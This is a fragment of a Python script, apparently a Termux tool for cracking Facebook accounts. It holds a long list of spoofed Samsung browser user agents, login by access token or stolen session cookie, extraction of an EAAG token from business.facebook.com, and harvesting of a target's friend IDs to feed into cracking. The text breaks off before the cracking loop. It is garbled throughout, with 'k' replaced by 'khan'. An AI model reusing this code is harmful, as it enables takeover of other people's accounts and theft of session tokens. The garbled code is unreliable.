AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTkhan2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605khan/khankhanU3CTF2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906khan/khanTU1CPL1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/khanSU4CRJ2 Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29khan) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.125 Mobile Safari/537.36']
# INDICATION
id,id2,loop,akhanun,oprekhan,method,lisensikhanu,taplikhanasi,tokhanenkhanu,uid,lisensikhanuni= [],[],0,[],[],[],[],[],[],[],[]
cp = 0
okhan = []
try:
	os.mkhandir('/sdcard/')
except:pass
# COLORS
x = '\33[m' 
khan = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
khan = '\033[95m' 
khankhan = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
# Converter 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okhanc = 'Okhan-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
# BACkhan
def backhan():
	login()

khan="khan-"
imt="-Busra4786=="
akhan="Lover-"
myid=uuid.uuid4().hex[:10].upper()
try:
	khaney1 = open('/data/data/com.termux/files/usr/bin/.mrkhan-cov', 'r').read()
except:
	khanokhan=open('/data/data/com.termux/files/usr/bin/.mrkhan-cov', 'w')
	khanokhan.write(myid+imt)
	khanokhan.close()
def login():
	try:
		tokhanen = open('.tokhanen.txt','r').read()
		tokhanenkhanu.append(tokhanen)
		try:
			sy = requests.get('https://graph.facebookhan.com/me?access_tokhanen='+tokhanenkhanu[0])
			public_menu()
		except khaneyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		Public()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
############### #LOGO############## ## 

# LOGIN
def Public():
	clear()
	print(logo)
	print  (' [01] Login With Tokhanen\n [02] Login With Cookhanie')
	pil=input('\n [#] Select One : ')
	if pil in ['1','01']:
		panda = input(' [+] Tokhanen : ')
		akhanun=open('.tokhanen.txt','w').write(panda)
		try:
			tes = requests.get('https://graph.facebookhan.com/me?access_tokhanen='+panda)
			tes3 = json.loads(tes.text)['id']
			print (" [] Login Successful")
			login()
		except khaneyError:
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			Public()
		except requests.exceptions.ConnectionError:
			print ( ' [×] Connection Timeout')
			exit()
	elif pil in ['2','02']:
		try:
			cookhanie=input(" [+] Cookhanie : ")
			data = requests.get("https://business.facebookhan.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebookhan.com/","host": "business.facebookhan.com","origin": "https://business.facebookhan.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookhanies = {"cookhanie":cookhanie}) 
			find_tokhanen = re.search("(EAAG\w+)", data.text)
			khanen=open(".tokhanen.txt", "w").write(find_tokhanen.group(1))
			print (" [] Login Successful")
			login()
		except Exception as e: 
			os.system("rm -f .tokhanen.txt")
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			login()
			exit()
def public_menu():
	try:
		tokhanen = open('.tokhanen.txt','r').read()
	except IOError:
		exit()
	clear()
	print(logo)
	pil = input('\n [+] Enter ID Target : ')
	try:
		khanoh2 = requests.get('https://graph.facebookhan.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_tokhanen='+tokhanenkhanu[0]).json()
		for pi in khanoh2['friends']['data']:
			id.append(pi['id']+'|'+pi['name'])
		print(' [] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print (' [#] Connection Time Out')
		exit()
	except (khaneyError,IOError):
		print(' [!] Not public Or Tokhanen Expire')
		exit()
def File():
			clear()
			print(logo)
			try:
				fileX = input ('\n [+] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n [!] file %s not found"%(fileX))

def setting():
	hu = ("2")
	if hu in ['1','01']:
